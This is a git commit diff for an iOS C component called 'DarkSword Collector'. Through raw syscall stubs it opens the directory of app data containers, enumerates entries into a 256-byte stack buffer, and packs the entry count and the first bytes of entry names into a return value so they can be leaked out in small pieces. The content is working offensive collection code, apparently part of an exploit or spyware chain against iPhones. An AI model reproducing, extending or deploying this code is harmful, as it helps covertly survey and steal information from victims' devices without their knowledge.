c9151a931b2c71ed3158ba0076faecf9b16d7a85
flylin <linxiang1208@gmail.com>
2026-09-25 00:44:43 +0800

    v40: minimal 256B stack buffer dir enum, single call

--- src/raw_collector.c
+++ src/raw_collector.c
@@ -1,6 +1,5 @@
 /**
- * DarkSword Collector v39 - Directory enumeration (stack buffer)
- * Uses stack buffer for getdirentries to avoid __TEXT write issues
+ * DarkSword Collector v40 - Minimal dir enumeration (256B buffer)
  */
 
 static long _svc1(long n, long a) {
@@ -25,70 +24,41 @@ static long _svc4(long n, long a, long b, long c, long d) {
 #define SYS_getdirentries 196
 #define O_RDONLY 0
 
-static volatile int g_ctx = 0;
-
-/* dirent layout on iOS: d_ino(8) + d_seekoff(8) + d_reclen(2) + d_namlen(2) + d_type(1) + d_name(...) = 21 bytes header */
-
 int ds_start(void) {
-    int ctx;
-    __asm__("ldr %w0, [%1]" : "=r"(ctx) : "r"(&g_ctx));
-    int cnt = ctx & 0xFFFF;
-
-    if (cnt >= 50) {
-        __asm__("str %w0, [%1]" : : "r"(0), "r"(&g_ctx));
-        return 0xFFFFFFFF;
-    }
-
     int fd = (int)_svc2(SYS_open, (long)"/var/mobile/Containers/Data/Application/", O_RDONLY);
     if (fd < 0) return 0xFE000000;
 
-    /* Stack buffer - 2KB should hold many entries */
-    unsigned char buf[2048];
-    for (int i = 0; i < 2048; i++) buf[i] = 0;
+    /* Small stack buffer - just enough for a few entries */
+    unsigned char buf[256];
+    for (int i = 0; i < 256; i++) buf[i] = 0;
     long basep = 0;
-    int nread = (int)_svc4(SYS_getdirentries, fd, (long)buf, 2048, (long)&basep);
+    int nread = (int)_svc4(SYS_getdirentries, fd, (long)buf, 256, (long)&basep);
     _svc1(SYS_close, fd);
 
-    if (nread < 1) {
-        __asm__("str %w0, [%1]" : : "r"(50), "r"(&g_ctx));
-        return 0xEE000000;
-    }
+    if (nread < 1) return 0xEE000000;
 
-    /* Count entries and get info about entry #cnt */
+    /* Count entries, get first non-dot entry info */
     int pos = 0;
-    int entry_num = 0;
-    int total = 0;
-    int target_namlen = 0;
-    unsigned char target_first = 0;
-    unsigned char target_second = 0;
+    int count = 0;
+    unsigned char first_byte = 0;
+    unsigned short first_namlen = 0;
 
-    while (pos < nread && pos < 2048) {
-        /* d_reclen at offset 8 (uint16) */
+    while (pos < nread && pos < 240) {
         unsigned short reclen = *(unsigned short *)(buf + pos + 8);
-        /* d_namlen at offset 10 (uint16) */
         unsigned short namlen = *(unsigned short *)(buf + pos + 10);
-        /* d_type at offset 11 (uint8) */
-        unsigned char dtype = *(unsigned char *)(buf + pos + 11);
-        /* d_name starts at offset 12 */
+        if (reclen < 12 || reclen > 256) break;
 
-        if (reclen < 1 || reclen > 512) break;
-
-        /* Skip . and .. */
-        if (namlen > 2 || (namlen == 1 && buf[pos+12] != '.') || (namlen == 2 && (buf[pos+12] != '.' || buf[pos+13] != '.'))) {
-            total++;
-            if (total == cnt + 1) {
-                target_namlen = namlen;
-                target_first = buf[pos + 12];
-                if (namlen > 1) target_second = buf[pos + 13];
+        unsigned char c = buf[pos + 12]; /* first char of d_name */
+        if (!(namlen == 1 && c == '.') && !(namlen == 2 && c == '.')) {
+            count++;
+            if (count == 1) {
+                first_byte = c;
+                first_namlen = namlen;
             }
         }
-
         pos += reclen;
     }
 
-    int nc = (cnt + 1);
-    __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx));
-
-    /* Return: total entries in low 8 bits, target_namlen in bits 8-15, first byte in 16-23, second in 24-31 */
-    return (total & 0xFF) | ((target_namlen & 0xFF) << 8) | ((target_first & 0xFF) << 16) | ((target_second & 0xFF) << 24);
+    /* Return: count(8) | namlen(8) | first_byte(8) | reserved(8) */
+    return (count & 0xFF) | ((first_namlen & 0xFF) << 8) | ((first_byte & 0xFF) << 16);
 }
